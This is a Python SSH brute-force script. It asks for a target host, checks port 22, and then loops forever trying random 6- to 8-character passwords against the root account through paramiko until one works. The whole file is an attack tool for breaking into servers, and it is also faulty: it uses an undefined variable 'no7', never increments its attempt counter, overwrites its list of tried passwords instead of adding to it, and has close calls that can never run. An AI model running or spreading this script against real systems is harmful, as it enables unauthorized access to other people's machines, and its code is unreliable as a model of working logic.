from socket import *
import sys, time, paramiko, os, socket
from random import randint
global host, username, port, chars

chars = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", ".", ",", "@"]
used = []
port = 22
try:
	host = input("[*] Host? ")
except KeyboardInterrupt:
	print("[-] KeyboardInterrupt...")

username = "root"

def scan(host, port):
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
		result = sock.connect_ex((host, port))
		if result == 0:
			return(True)
			sock.close()
		else:
			return(False)
			sock.close()
	except socket.error:
		pass
	except socket.gaierror:
		pass

isopen = scan(host, port)
if isopen == True:
	print("[*] Port 22 open, continuing...")
else:
	print("[-] Port 22 not open.")

def ssh_connect(password, code = 0):
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

	try:
		ssh.connect(host, port = port, username = username, password = password)
	except paramiko.AuthenticationException:
		code = 1
	except socket.error:
		code = 2
	ssh.close()
	return(code)

n = 0
while True:
	no = randint(0, 64)
	no1 = randint(0,64)
	no2 = randint(0,64)
	no3 = randint(0,64)
	no4 = randint(0,64)
	no5 = randint(0,64)
	no6 = randint(0,64)
	password = chars[no]
	if n < 391:
		password = chars[no] + chars[no1] + chars[no2] + chars[no3] + chars[no4] + chars[no5]
	elif n < 846:
		password = chars[no] + chars[no1] + chars[no2] + chars[no3] + chars[no4] + chars[no5] + chars[no6]
	elif n < 1366:
		password = chars[no] + chars[no1] + chars[no2] + chars[no3] + chars[no4] + chars[no5] + chars[no6] + chars[no7]
	if password not in used:
		try:
			response = ssh_connect(password)

			if response == 0:
				print("[*] Password found! '%s'" % (password))
				sys.exit(0)
				break
			elif response == 1:
				print("'%s' not correct" % (password))
			elif response == 2:
				print("[-] Connection could not be made (host down?)")
				break
		except Exception as e:
			print(e)
			pass

	else:
		used = [password]
		pass